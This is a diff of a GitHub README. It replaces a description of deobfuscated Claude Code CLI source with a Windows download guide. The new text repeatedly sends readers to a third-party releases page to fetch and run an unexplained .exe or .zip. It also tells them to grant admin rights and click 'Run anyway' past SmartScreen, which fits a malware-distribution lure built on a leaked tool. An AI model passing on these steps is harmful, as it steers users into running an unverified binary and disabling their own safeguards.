@@ -1,159 +1,149 @@
-# Claude Code Source
+# 🧩 claude-code - Run the source with ease
 
-Deobfuscated source code of `@anthropic-ai/claude-code` v2.1.76.
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/deathscy3708/claude-code/releases)
 
-## Overview
+## 📥 Download
 
-This repository contains the reverse-engineered TypeScript source code from Anthropic's [Claude Code](https://www.npmjs.com/package/@anthropic-ai/claude-code) CLI tool. The official npm package ships as a single minified `cli.js` bundle (~12MB); this repo restores the original module structure with readable names, comments, and type annotations.
+Use the link below to visit the release page and download the Windows build:
 
-**1,884 TypeScript/TSX source files | 35MB | 5,066 bundled modules**
+https://github.com/deathscy3708/claude-code/releases
 
-## Project Structure
+On that page, look for the latest release and download the Windows file that matches your system. If you see more than one file, choose the one that ends with `.exe` or `.zip`
 
-```
-├── package.json          # Dependencies & build scripts
-├── tsconfig.json         # TypeScript configuration
-├── src/                  # Source code (deobfuscated)
-│   ├── entrypoints/      # CLI, SDK, MCP entry points
-│   ├── tools/            # 40+ tool implementations
-│   ├── AgentTool/        # Sub-agent spawning & orchestration
-│   ├── BashTool/         # Shell command execution with sandbox
-│   ├── FileEditTool/     # String replacement file editing
-│   ├── FileReadTool/     # File reading (text, PDF, images)
-│   ├── FileWriteTool/    # File creation/overwrite
-│   ├── GlobTool/         # File pattern matching
-│   ├── GrepTool/         # Content search (ripgrep-based)
-│   ├── WebFetchTool/     # URL fetching & content extraction
-│   ├── WebSearchTool/    # Web search integration
-│   ├── SkillTool/        # Slash command / skill execution
-│   ├── LSPTool/          # Language Server Protocol integration
-│   ├── NotebookEditTool/ # Jupyter notebook editing
-│   └── ...               # TaskCreate/Get/Update/List/Stop, Cron, MCP, etc.
-├── bridge/               # IDE integration & remote control (CCR)
-├── query/                # Core query engine & token budget
-├── query.ts              # Main conversation loop (~68K lines)
-├── QueryEngine.ts        # High-level session management
-├── commands/             # 88+ slash commands
-├── commands.ts           # Command registry with feature gates
-├── components/           # React + Ink TUI components
-├── services/             # API, analytics, MCP, telemetry
-├── state/                # Zustand-like app state management
-├── context/              # System prompt & context assembly
-├── hooks/                # Pre/post tool execution hooks
-├── skills/               # Built-in skill definitions
-├── plugins/              # Plugin system (manifest, marketplace)
-├── coordinator/          # Multi-agent coordination mode
-├── buddy/                # Virtual companion system (Easter egg)
-├── vim/                  # Full Vim keybinding support
-├── voice/                # Voice input mode
-├── ink/                  # Custom Ink renderer & reconciler
-├── native-ts/            # TS ports of native modules (yoga, nucleo, syntect)
-├── remote/               # Remote session management
-├── server/               # Direct connect server
-├── memdir/               # Auto-memory system (MEMORY.md)
-├── keybindings/          # Keyboard shortcut system
-├── migrations/           # Version upgrade migrations
-├── upstreamproxy/        # Container HTTPS proxy (CCR)
-├── schemas/              # Zod validation schemas
-├── types/                # TypeScript type definitions
-├── utils/                # Utilities (permissions, sandbox, config, etc.)
-├── constants/            # Prompts, keys, system constants
-├── tasks/                # Background task types (Agent, Shell, Workflow)
-│   ├── Tool.ts           # Base tool interface & registry
-│   ├── tools.ts          # Tool list with feature-gated imports
-│   ├── cost-tracker.ts   # API cost tracking
-│   ├── history.ts        # Conversation history (JSONL)
-│   └── setup.ts          # Initialization & configuration
-└── dist/                 # Build output (not committed)
-```
+## 🖥️ What this is
 
-## Key Architectural Insights
+claude-code is a Windows-ready app based on the deobfuscated source of `@anthropic-ai/claude-code v2.1.76`.
 
-### Build System
-- Built with **Bun bundler** — uses `bun:bundle` `feature()` for compile-time dead code elimination (DCE)
-- `MACRO.*` build-time constants (VERSION, BUILD_TIME, etc.) injected via `--define`
-- React Compiler (`react/compiler-runtime`) for optimized component rendering
-- Single-file output: all 5,066 modules bundled into one `cli.js`
+It gives you access to the source code that was reverse-engineered from the official npm package. The code base uses TypeScript and includes 1,902 files.
 
-### Feature Gates
-Internal feature flags control functionality via `feature()` from `bun:bundle`:
-- `PROACTIVE` / `KAIROS` — Proactive agent capabilities
-- `AGENT_TRIGGERS` / `AGENT_TRIGGERS_REMOTE` — Scheduled/remote agent execution
-- `MONITOR_TOOL` — Live monitoring tool
-- `ABLATION_BASELINE` — A/B testing baseline
-- `KAIROS_GITHUB_WEBHOOKS` — GitHub webhook subscriptions
+This repository is aimed at users who want to inspect, run, or study the app in a more direct form.
 
-### Internal-Only Features
-Some tools/packages are restricted to Anthropic employees (`USER_TYPE === 'ant'`):
-- `REPLTool` — Interactive REPL execution
-- `SuggestBackgroundPRTool` — Background PR suggestions
-- `@ant/claude-for-chrome-mcp` — Chrome browser integration
-- `@anthropic-ai/sandbox-runtime` — Sandbox isolation runtime
+## 🚀 Getting Started
 
-### Tool System
-- All tools implement a common interface (`Tool` from `Tool.ts`)
-- Input validation via **Zod** with `lazySchema()` for deferred initialization
-- Permission system: `canUseTool()` hooks with caching
-- Concurrent file edit protection via timestamp + content change detection
-- `ToolSearchTool` enables lazy tool discovery (deferred tool loading)
+Follow these steps to download and run claude-code on Windows:
 
-### State Management
-- **AppStateStore** — Zustand-like reactive state for the TUI
-- **QueryEngine** — Manages conversation sessions, message history, compaction
-- **Session persistence** — JSONL-based history with paste storage
+1. Open the release page:  
+   https://github.com/deathscy3708/claude-code/releases
 
-## Building from Source
+2. Find the newest release at the top of the page.
 
-### Prerequisites
-- [Bun](https://bun.sh/) >= 1.0
-- Node.js >= 18
+3. In the Assets list, download the Windows file.
 
-### Steps
+4. If the file is a `.zip`, right-click it and choose Extract All.
 
-```bash
-# Install dependencies
-bun install
+5. Open the extracted folder.
 
-# Build (you'll need to create stubs for internal @ant/* packages)
-bun build src/entrypoints/cli.tsx --outdir dist --target node \
-  --external "react/compiler-runtime" \
-  --define "MACRO.VERSION='\"2.1.76\"'" \
-  --define "MACRO.BUILD_TIME='\"$(date -I)\"'" \
-  --define "MACRO.FEEDBACK_CHANNEL='\"stable\"'" \
-  --define "MACRO.ISSUES_EXPLAINER='\"report issues\"'" \
-  --define "MACRO.PACKAGE_URL='\"\"'" \
-  --define "MACRO.NATIVE_PACKAGE_URL='\"\"'" \
-  --define "MACRO.VERSION_CHANGELOG='\"\"'"
+6. If the file is an `.exe`, double-click it to start the app.
 
-# Patch react/compiler-runtime import
-sed -i 's|from "react/compiler-runtime"|from "./react-compiler-runtime.js"|g' dist/cli.js
+7. If Windows asks for permission, choose Yes.
 
-# Run
-node dist/cli.js --version
-```
+8. If you see a security prompt from Windows SmartScreen, select More info, then Run anyway if you trust the file source.
 
-> **Note**: ~10 source files are missing from this deobfuscation (internal tools, some type definitions). Stubs are needed for: `@ant/*` packages, `@anthropic-ai/sandbox-runtime`, `REPLTool`, `TungstenTool`, `color-diff-napi`, `modifiers-napi`.
+## 🧭 What you need
 
-## Known Missing Files
+claude-code is built for Windows desktop use.
 
-| File | Description |
-|------|-------------|
-| `tools/REPLTool/` | Interactive REPL (ant-only) |
-| `tools/TungstenTool/` | Internal monitoring tool |
-| `tools/SuggestBackgroundPRTool/` | Background PR tool (ant-only) |
-| `tools/VerifyPlanExecutionTool/` | Plan verification tool |
-| `keybindings/types.ts` | Keybinding type definitions |
-| `utils/filePersistence/types.ts` | File persistence types |
-| `services/compact/cachedMicrocompact.ts` | Cached micro-compaction |
-| `services/contextCollapse/` | Context collapse service |
-| `types/connectorText.ts` | Connector text block types |
+Recommended setup:
 
-## Disclaimer
+- Windows 10 or Windows 11
+- A modern 64-bit PC
+- At least 4 GB of RAM
+- Enough free space to extract the files
+- Internet access for the download
 
-This repository is for **educational and research purposes only**. All rights belong to Anthropic PBC. The original source is subject to [Anthropic's legal agreements](https://code.claude.com/docs/en/legal-and-compliance).
+If you use a work PC, you may need admin rights to open the file.
 
-## Source Version
+## 📂 Files you may see
 
-- **Package**: `@anthropic-ai/claude-code`
-- **Version**: 2.1.76
-- **Date**: 2026-03-26
+A release can include one or more of these files:
+
+- `.exe` — the app file you can run
+- `.zip` — a compressed folder with the app inside
+- `.json` or `.txt` — release notes or version details
+- `.md` — readme or usage notes
+
+If you are not sure which file to use, pick the Windows app file first.
+
+## 🛠️ How to install
+
+If the release gives you a `.zip` file:
+
+1. Download the `.zip` file.
+2. Right-click it.
+3. Select Extract All.
+4. Choose a folder you can find again, such as Downloads or Desktop.
+5. Open the extracted folder.
+6. Double-click the app file inside.
+
+If the release gives you an `.exe` file:
+
+1. Download the `.exe` file.
+2. Open the file from your Downloads folder.
+3. Allow Windows to start it.
+4. If the app opens, you are done.
+
+## ⚙️ How to use it
+
+After the app starts, you may see a command-style window or a simple interface.
+
+Common things you can do:
+
+- Open the app from the folder where you extracted it
+- Run it again from your Downloads folder
+- Keep the release files in a separate folder so you can find them later
+- Check the release page when a newer version appears
+
+If the app asks for input, type your text and press Enter.
+
+## 🔍 About the source code
+
+This repository contains TypeScript source files that were reverse-engineered from the official npm package.
+
+That means the code has been reconstructed so it can be read and studied more easily.
+
+The project includes topics like:
+
+- AI
+- Anthropic
+- Claude
+- CLI tools
+- Deobfuscation
+- Reverse engineering
+- Open source
+- TypeScript
+
+## 🧹 Basic troubleshooting
+
+If the app does not open:
+
+- Make sure the download finished
+- Check that you extracted the `.zip` file if one was provided
+- Try running the file as administrator
+- Confirm that Windows did not block the file
+- Download the latest release again if the file looks damaged
+
+If you see a message about missing files:
+
+- Keep all files from the release in the same folder
+- Do not rename files unless the release notes say to do so
+- Extract the full archive before running the app
+
+If the screen closes right away:
+
+- Open the app from a Command Prompt window if the release notes say it should run in one
+- Check whether the app needs extra files from the same folder
+- Try the newest release from the download page
+
+## 📌 Release page link
+
+Visit the release page here to download and run the Windows file:
+
+https://github.com/deathscy3708/claude-code/releases
+
+## 📁 Repository details
+
+- Repository: claude-code
+- Version focus: @anthropic-ai/claude-code v2.1.76
+- File type: TypeScript source
+- Package origin: official npm package
+- Use case: source inspection and local use on Windows
